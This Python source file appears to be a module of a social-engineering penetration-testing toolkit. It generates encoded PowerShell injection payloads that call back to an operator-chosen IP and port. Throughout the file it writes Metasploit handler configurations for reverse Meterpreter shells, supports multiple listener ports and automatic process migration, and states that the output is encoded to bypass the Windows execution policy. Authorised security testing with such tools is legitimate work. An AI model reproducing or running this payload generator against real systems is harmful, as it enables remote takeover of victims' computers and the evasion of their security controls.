#!/usr/bin/env python
import sys
import subprocess
import re
import os
import time
from src.core.setcore import *

# grab stage encoding flag
stage_encoding = check_config("STAGE_ENCODING=").lower()
if stage_encoding == "off":
    stage_encoding = "false"
else:
    stage_encoding = "true"

# check to see if we are just generating powershell code
powershell_solo = check_options("POWERSHELL_SOLO")

# check if port is there
port = check_options("PORT=")

# check if we are using auto_migrate
auto_migrate = check_config("AUTO_MIGRATE=")

# check if we are using pyinjection
pyinjection = check_options("PYINJECTION=")
if pyinjection == "ON":
    # check to ensure that the payload options were specified right
    if os.path.isfile(userconfigpath + "payload_options.shellcode"):
        pyinjection = "on"
        print_status(
            "Multi/Pyinjection was specified. Overriding config options.")
    else:
        pyinjection = "off"

# grab ipaddress
if check_options("IPADDR=") != 0:
    ipaddr = check_options("IPADDR=")
else:
    ipaddr = input("Enter the ipaddress for the reverse connection: ")
    update_options("IPADDR=" + ipaddr)

# check to see if we are using multi powershell injection
multi_injection = check_config("POWERSHELL_MULTI_INJECTION=").lower()

# turn off multi injection if pyinjection is specified
if pyinjection == "on":
    multi_injection = "off"

# check what payloads we are using
powershell_inject_x86 = check_config("POWERSHELL_INJECT_PAYLOAD_X86=")

# if we specified a hostname then default to reverse https/http
if validate_ip(ipaddr) == False:
    powershell_inject_x86 = "windows/meterpreter/reverse_https"

# prompt what port to listen on for powershell then make an append to the current
# metasploit answer file
if os.path.isfile("%s/meta_config_multipyinjector" % (userconfigpath)):
    # if we have multi injection on, don't worry about these
    if multi_injection != "on":
        if pyinjection == "off":
            print_status(
                "POWERSHELL_INJECTION is set to ON with multi-pyinjector")
            port = input(setprompt(
                ["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
            if port == "":
                port = "443"
            fileopen = open("%s/meta_config_multipyinjector" % (userconfigpath), "r")
            data = fileopen.read()
            match = re.search(port, data)
            if not match:
                filewrite = open(
                    "%s/meta_config_multipyinjector" % (userconfigpath), "a")
                filewrite.write("\nuse exploit/multi/handler\n")
                if auto_migrate == "ON":
                    filewrite.write(
                        "set AutoRunScript post/windows/manage/smart_migrate\n")
                filewrite.write("set PAYLOAD %s\nset LHOST %s\nset LPORT %s\nset EnableStageEncoding %s\nset ExitOnSession false\nexploit -j\n" %
                                (powershell_inject_x86, ipaddr, port, stage_encoding))
                filewrite.close()

# if we have multi injection on, don't worry about these
if multi_injection != "on":
    if pyinjection == "off":
        # check to see if the meta config multi pyinjector is there
        if not os.path.isfile("%s/meta_config_multipyinjector" % (userconfigpath)):
            if check_options("PORT=") != 0:
                port = check_options("PORT=")
            # if port.options isnt there then prompt
            else:
                port = input(setprompt(
                    ["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
                if port == "":
                    port = "443"
                update_options("PORT=" + port)

# turn off multi_injection if we are riding solo from the powershell menu
if powershell_solo == "ON":
    multi_injection = "off"
    pyinjection = "on"

# if we are using multi powershell injection
if multi_injection == "on":
    if pyinjection == "off":
        print_status(
            "Multi-Powershell-Injection is set to ON, this should be sweet...")

# define a base variable
x86 = ""

# specify a list we will use for later
multi_injection_x86 = ""

# here we do some funky loops so we don't need to rewrite the code below
if multi_injection == "on":
    port = check_config("POWERSHELL_MULTI_PORTS=")
    port = port.split(",")

if multi_injection == "on":
    # iterate through the ports, used for POWERSHELL_MULTI_PORTS
    for ports in port:
        # dont cycle through if theres a blank
        if ports != "":
            print_status(
                "Generating x86-based powershell injection code for port: %s" % (ports))
            multi_injection_x86 = multi_injection_x86 + "," + \
                generate_powershell_alphanumeric_payload(
                    powershell_inject_x86, ipaddr, ports, x86)

            if os.path.isfile("%s/meta_config_multipyinjector" % (userconfigpath)):
                port_check = check_ports(
                    "%s/meta_config_multipyinjector" % (userconfigpath), ports)
                if port_check == False:
                    filewrite = open(
                        "%s/meta_config_multipyinjector" % (userconfigpath), "a")
                    filewrite.write("\nuse exploit/multi/handler\n")
                    if auto_migrate == "ON":
                        filewrite.write(
                            "set AutoRunScript post/windows/manage/smart_migrate\n")
                    filewrite.write("set PAYLOAD %s\nset LHOST %s\nset EnableStageEncoding %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (
                        powershell_inject_x86, ipaddr, stage_encoding, ports))
                    filewrite.close()

            # if we aren't using multi pyinjector
            if not os.path.isfile("%s/meta_config_multipyinjector" % (userconfigpath)):
                # if meta config isn't created yet then create it
                if not os.path.isfile("%s/meta_config" % (userconfigpath)):
                    filewrite = open("%s/meta_config" % (userconfigpath), "w")
                    filewrite.write("")
                    filewrite.close()
                port_check = check_ports("%s/meta_config" % (userconfigpath), ports)
                if port_check == False:
                    filewrite = open("%s/meta_config" % (userconfigpath), "a")
                    filewrite.write("\nuse exploit/multi/handler\n")
                    if auto_migrate == "ON":
                        filewrite.write(
                            "set AutoRunScript post/windows/manage/smart_migrate\n")
                    filewrite.write("set PAYLOAD %s\nset LHOST %s\nset EnableStageEncoding %s\nset ExitOnSession false\nset LPORT %s\nexploit -j\n\n" % (
                        powershell_inject_x86, ipaddr, stage_encoding, ports))
                    filewrite.close()

# here we do everything if pyinjection or multi pyinjection was specified
if pyinjection == "on":
    multi_injection_x86 = ""
    # read in the file we need for parsing
    fileopen = open(userconfigpath + "payload_options.shellcode", "r")
    payloads = fileopen.read()[:-1].rstrip()  # strips an extra ,
    payloads = payloads.split(",")
    # format: payload<space>port
    for payload in payloads:
        # format: payload<space>port
        payload = payload.split(" ")
        powershell_inject_x86 = payload[0]
        port = payload[1]
        print_status("Generating x86-based powershell injection code...")
        multi_injection_x86 = multi_injection_x86 + "," + \
            generate_powershell_alphanumeric_payload(
                powershell_inject_x86, ipaddr, port, x86)

# if its turned to off
if multi_injection == "off":
    if pyinjection == "off":
        print_status("Generating x86-based powershell injection code...")
        x86 = generate_powershell_alphanumeric_payload(
            powershell_inject_x86, ipaddr, port, x86)

# if we are specifying multi powershell injection
if multi_injection == "on" or pyinjection == "on":
    x86 = multi_injection_x86[1:]  # remove comma at beginning

# check to see if we want to display the powershell command to the user
verbose = check_config("POWERSHELL_VERBOSE=")
if verbose.lower() == "on":
    print_status("Printing the x86 based encoded code...")
    time.sleep(3)
    print(x86)

filewrite = open("%s/x86.powershell" % (userconfigpath), "w")
filewrite.write(x86)
filewrite.close()
print_status("Finished generating powershell injection bypass.")
print_status("Encoded to bypass execution restriction policy...")
